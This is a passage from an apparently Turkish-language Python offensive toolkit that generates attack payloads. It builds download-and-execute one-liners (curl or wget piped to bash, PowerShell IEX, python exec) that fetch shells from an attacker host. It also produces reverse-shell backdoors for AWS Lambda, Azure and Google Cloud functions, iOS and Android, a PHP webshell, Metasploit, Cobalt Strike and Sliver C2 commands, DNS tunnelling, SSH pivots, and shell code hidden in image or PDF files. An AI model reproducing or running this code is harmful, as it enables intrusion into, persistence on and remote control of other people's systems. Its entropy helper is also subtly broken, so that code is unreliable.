                yerel_port = input("[?] Yerel port (varsayılan 1080): ") or "1080"
                config = pivot.socks_proxy_olustur(atlama_makinesi, yerel_port)
            else:
                config = "Geçersiz seçim"
            
            print(f"\n[Atlama Konfigürasyonu]:\n{config}")
            
        except Exception as e:
            print(f"[!] Hata: {e}")

    def web_sunucu_baslat(self, port=8000):
        def sunucu_baslat():
            os.chdir('/tmp')
            handler = SimpleHTTPRequestHandler
            httpd = HTTPServer(('0.0.0.0', port), handler)
            print(f"[+] Web sunucusu {port} portunda başlatıldı")
            httpd.serve_forever()
        
        thread = threading.Thread(target=sunucu_baslat)
        thread.daemon = True
        thread.start()
        return thread

    def web_delivery_olustur(self, ip, port, method='python'):
        sablonlar = {
            'python': f"python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://{ip}:{port}/shell.py').read())\"",
            'powershell': f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\"",
            'curl_bash': f"curl -s http://{ip}:{port}/shell.sh | bash",
            'wget_bash': f"wget -q -O- http://{ip}:{port}/shell.sh | bash"
        }
        return sablonlar.get(method, "Desteklenmeyen method")

    def toplu_olustur(self, ip, port, shell_turleri, secenekler):
        sonuclar = {}
        for shell_turu in shell_turleri:
            sonuclar[shell_turu] = self.gelismis_shell_olustur(
                shell_turu, ip, port, secenekler
            )
        return sonuclar

    def payload_analiz(self, payload):
        ai_motoru = self.AIPayloadGenerator()
        analiz = ai_motoru.payload_analiz(payload)
        
        return {
            'uzunluk': len(payload),
            'entropi': self.entropi_hesapla(payload),
            'supheli_kelimeler': analiz['tespit_edilenler'],
            'risk_seviyesi': analiz['risk_puani'],
            'oneriler': analiz['oneriler']
        }
    
    def entropi_hesapla(self, veri):
        if not veri:
            return 0
        entropi = 0
        for x in range(256):
            p_x = float(veri.count(chr(x))) / len(veri)
            if p_x > 0:
                entropi += - p_x * (p_x.bit_length() - 1)
        return entropi

    def gomulu_payload_olustur(self, dosya_turu, shell_kodu, cikti_dosyasi):
        if dosya_turu == 'resim':
            return self.resime_gom(shell_kodu, cikti_dosyasi)
        elif dosya_turu == 'pdf':
            return self.pdfe_gom(shell_kodu, cikti_dosyasi)
        else:
            return "Desteklenmeyen dosya türü"

    def resime_gom(self, shell_kodu, cikti_dosyasi):
        try:
            cmd = f"exiftool -Comment='{base64.b64encode(shell_kodu.encode()).decode()}' {cikti_dosyasi}"
            return f"Resime gömüldü: {cmd}"
        except:
            return "Resime gömme başarısız"

    def pdfe_gom(self, shell_kodu, cikti_dosyasi):
        try:
            encoded = base64.b64encode(shell_kodu.encode()).decode()
            return f"PDF gömme komutu: echo '{encoded}' | base64 -d >> {cikti_dosyasi}"
        except:
            return "PDF gömme başarısız"

    class CloudEntegrasyon:
        def aws_lambda_backdoor(self, ip, port):
            return f"""
import json
import socket
import subprocess
import os

def lambda_handler(event, context):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/sh', '-i'])
    except Exception as e:
        return {{'statusCode': 200, 'body': str(e)}}
    return {{'statusCode': 200, 'body': 'OK'}}
            """
        
        def azure_fonksiyon_shell(self, ip, port):
            return f"""
import socket
import subprocess
import os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/sh', '-i'])
    except Exception as e:
        return func.HttpResponse(str(e))
    return func.HttpResponse("OK")
            """
        
        def google_cloud_shell(self, ip, port):
            return f"""
import socket
import subprocess
import os

def cloud_shell(request):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/bash', '-i'])
    except Exception as e:
        return str(e)
    return 'OK'
            """

    class MobilePayloadlar:
        def android_shell(self, ip, port):
            return f"""
try {{
    Process process = Runtime.getRuntime().exec("/system/bin/sh");
    DataOutputStream os = new DataOutputStream(process.getOutputStream());
    Socket socket = new Socket("{ip}", {port});
}} catch (Exception e) {{
    e.printStackTrace();
}}
            """
        
        def ios_shell(self, ip, port):
            return f"""
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {{0}};
    addr.sin_family = AF_INET;
    addr.sin_port = htons({port});
    inet_pton(AF_INET, "{ip}", &addr.sin_addr);
    
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execl("/bin/sh", "sh", NULL);
    return 0;
}}
            """

    class ProtokolKullanimi:
        def dns_tunnel(self, domain, port=53):
            return f"""
./dnscat2 {domain} --dns port={port}
            """
        
        def http_webshell(self, ip, port, path="/shell.php"):
            return f"""
<?php
if(isset($_REQUEST['cmd'])){{
    $output = shell_exec($_REQUEST['cmd']);
    echo "<pre>$output</pre>";
}}
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>
            """
        
        def smb_shell(self, ip, paylasim_adi):
            return f"""
impacket-smbserver -smb2support {paylasim_adi} .
            """

    class C2Entegrasyon:
        def __init__(self):
            self.desteklenen_c2 = ['metasploit', 'cobalt_strike', 'sliver']
        
        def metasploit_olustur(self, ip, port, payload_tipi='linux/x64/meterpreter/reverse_tcp'):
            return f"""
use exploit/multi/handler
set PAYLOAD {payload_tipi}
set LHOST {ip}
set LPORT {port}
exploit -j
            """
        
        def cobalt_strike_olustur(self, ip, port):
            return f"""
beacon> socks 1080
beacon> rportfwd {port} {ip} {port}
            """
        
        def sliver_olustur(self, ip, port):
            return f"""
sliver > generate --os linux --arch amd64 --http {ip}:{port}
sliver > http --domain {ip} --port {port}
            """

    class PivotYonetici:
        def ssh_tunnel_olustur(self, atlama_makinesi, hedef_ip, hedef_port, yerel_port=1080):
            return f"""
ssh -L {yerel_port}:{hedef_ip}:{hedef_port} {atlama_makinesi}
            """
        
        def socks_proxy_olustur(self, atlama_makinesi, yerel_port=1080):
            return f"""
ssh -D {yerel_port} {atlama_makinesi}
            """

def main():
    try:
        generator = ShellGenerator()
        generator.calistir()
    except KeyboardInterrupt:
        print("\n[!] Program kullanıcı tarafından durduruldu")
    except Exception as e:
        print(f"\n[!] Kritik hata: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    try:
        import cryptography
    except ImportError:
        print("[!] Gerekli bağımlılıklar yükleniyor...")
        os.system("pip3 install cryptography > /dev/null 2>&1")
    
    try:
        import cryptography.fernet
        main()
    except ImportError:
        print("[!] Cryptography kütüphanesi yüklenemedi. Manuel kurulum gerekli.")
        print("    pip3 install cryptography")